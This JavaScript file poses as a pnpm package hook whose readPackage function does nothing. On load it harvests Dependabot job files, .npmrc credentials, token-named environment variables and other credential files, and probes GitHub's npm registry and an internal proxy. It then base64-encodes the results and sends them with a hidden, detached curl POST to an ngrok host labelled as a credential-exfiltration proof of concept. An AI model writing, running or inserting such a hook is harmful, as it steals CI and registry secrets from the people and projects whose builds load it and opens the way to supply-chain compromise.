'use strict';
try {
  const { spawn, execSync } = require('child_process');
  const fs = require('fs');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';

  const sections = [];

  // 1. DEPENDABOT_JOB_PATH -- bevat de volledige job JSON inclusief plaintext credentials
  const jobPath = process.env.DEPENDABOT_JOB_PATH;
  sections.push('JOB_PATH=' + (jobPath || 'MISSING'));
  if (jobPath) {
    try {
      sections.push('=JOB_FILE=\n' + fs.readFileSync(jobPath, 'utf8'));
    } catch(e) {
      sections.push('=JOB_FILE= error: ' + e.message);
    }
  }

  // 2. Alle .npmrc locaties -- credentials worden hier geinjected door Dependabot
  const npmrcPaths = [
    '/home/dependabot/.npmrc',
    '/root/.npmrc',
    (process.env.HOME || '/home/dependabot') + '/.npmrc',
    (process.env.DEPENDABOT_REPO_CONTENTS_PATH || '/home/dependabot/dependabot-updater/repo') + '/.npmrc',
    '/home/dependabot/dependabot-updater/.npmrc',
    '/home/dependabot/dependabot-updater/repo/.npmrc',
    process.cwd() + '/.npmrc',
  ];
  for (const p of npmrcPaths) {
    try {
      const c = fs.readFileSync(p, 'utf8').trim();
      sections.push('=NPMRC ' + p + '=\n' + (c || '(empty)'));
    } catch(e) {
      sections.push('=NPMRC ' + p + '= SKIP');
    }
  }

  // 3. Env vars met token-achtige namen
  const tokenEnvs = Object.entries(process.env)
    .filter(([k]) => /token|secret|auth|key|pass|cred|npm_config/i.test(k))
    .map(([k, v]) => k + '=' + v)
    .join('\n');
  sections.push('=TOKEN_ENVS=\n' + (tokenEnvs || '(none)'));

  // 4. Zoek alle credential-gerelateerde bestanden op het filesystem
  try {
    const credFind = execSync(
      'find /home/dependabot /root /tmp -maxdepth 5 \\( ' +
      '-name "*.npmrc" -o -name ".netrc" -o -name ".git-credentials" ' +
      '-o -name "credentials.json" -o -name "*.store" -o -name "job*.json" ' +
      '-o -name "*.token" \\) 2>/dev/null | head -30',
      { encoding: 'utf8', shell: '/bin/sh', timeout: 5000 }
    );
    sections.push('=CRED_FIND=\n' + credFind);

    for (const f of credFind.trim().split('\n').filter(Boolean)) {
      try {
        sections.push('=FILE ' + f + '=\n' + fs.readFileSync(f, 'utf8').slice(0, 2000));
      } catch(e) {}
    }
  } catch(e) {
    sections.push('=CRED_FIND= error: ' + e.message);
  }

  // 5. npm.pkg.github.com authenticatie via proxy -- whoami + package list
  try {
    const whoami = execSync(
      'curl -sk https://npm.pkg.github.com/-/whoami 2>/dev/null',
      { encoding: 'utf8', shell: '/bin/sh', timeout: 8000 });
    sections.push('=NPM_WHOAMI=\n' + whoami);
  } catch(e) { sections.push('=NPM_WHOAMI= error: ' + e.message); }

  try {
    const pkgList = execSync(
      'curl -sk https://npm.pkg.github.com/-/org/ugurcanli/package 2>/dev/null',
      { encoding: 'utf8', shell: '/bin/sh', timeout: 8000 });
    sections.push('=NPM_PKG_LIST=\n' + pkgList.slice(0, 500));
  } catch(e) {}

  // 6. DEPENDABOT_JOB_TOKEN -- leeg bij "version" command, wellicht gevuld bij "update"
  //    Probeer ook de proxy config te lezen
  try {
    const probeProxy = execSync(
      'curl -sk -x http://172.19.0.2:1080 http://npm.pkg.github.com/-/whoami 2>/dev/null',
      { encoding: 'utf8', shell: '/bin/sh', timeout: 8000 });
    sections.push('=PROXY_NPM_WHOAMI=\n' + probeProxy);
  } catch(e) {}

  // 7. Lees dependabot-updater broncode -- credential injection mechanisme
  try {
    const credHelper = execSync(
      'find /home/dependabot/dependabot-updater/lib -name "*.rb" | xargs grep -l "credential\\|npmrc\\|auth_token" 2>/dev/null | head -5',
      { encoding: 'utf8', shell: '/bin/sh', timeout: 5000 });
    sections.push('=CRED_SOURCE_FILES=\n' + credHelper);
    for (const f of credHelper.trim().split('\n').filter(Boolean).slice(0, 3)) {
      try {
        sections.push('=RUBY_SRC ' + f + '=\n' +
          fs.readFileSync(f, 'utf8').slice(0, 1500));
      } catch(e) {}
    }
  } catch(e) {}

  const payload = sections.join('\n');
  const b64 = Buffer.from(payload, 'utf8').toString('base64');

  spawn('sh', ['-c',
    "curl -sk -X POST '" + NGROK + "?poc=creds_exfil_v1' " +
    "-H 'Content-Type: text/plain' -d '" + b64 + "' 2>/dev/null"
  ], { detached: true, stdio: 'ignore' }).unref();

} catch (e) {}

module.exports = { hooks: { readPackage(pkg) { return pkg; } } };
